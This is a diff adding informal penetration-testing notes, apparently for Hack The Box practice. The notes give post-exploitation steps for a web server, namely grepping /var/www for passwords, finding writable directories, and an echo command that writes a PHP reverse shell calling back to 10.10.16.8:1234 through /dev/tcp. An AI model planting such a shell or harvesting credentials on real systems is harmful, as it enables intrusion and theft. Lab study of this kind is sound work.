+		# enabled or disabled at a global level, it is possible to
+		# include a line for only one particular virtual host. For example the
+		# following line enables the CGI configuration for this host only
+		# after it has been globally disabled with "a2disconf".
+		#Include conf-available/serve-cgi-bin.conf
+	</VirtualHost>
+
+	# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+
+
+
+2. search deeper in /var/www/
+
+	if i found multiple folders inside it ?? ==> this could indecte that the server is running multiple web apps !!! 
+	
+	what to check too ?? how can upuse this !! 
+	
+	1. $ grep -roP 'passw.{0,30}'
+	
+		not passing through linked file !! navigate manually ^^  
+	
+	2. mostly as www-data user .... try to write a php reverse shell file in any writeable place to get a shell with privilaged user
+		
+		$ find . -writable -type d
+		$ echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/1234 0>&1'\");" > shell.php  		# escape the double quotes inside a double qoutes ^^ to bypass the overlapping  
+	
+	
+	
+	
+	
+	
+	1. AGAIN ::
+		$ grep -roP 'Web.{0,20}' 2>/dev/null
+		then
+		$ grep -rP 'Web.{0,10}' -B5 -A5 --exclude '*.js' 2>/dev/null
+		
+		TRY : 
+		$ grep -rP 'Web.{0,10}' -B5 -A5 2>/dev/null | awk 'length >= 1 && length <= 2000' | grep --color -P "Web|"	
+
+
+
+
+
+
+
+
+
+
+
+
+Highly recommend to see the writeup.pdf !!! 
+
+
+
+
+
+
+
+================================================================================================================
+HTB :: 
+
+
+
+
+
+
+
+
+
+
+
+ 
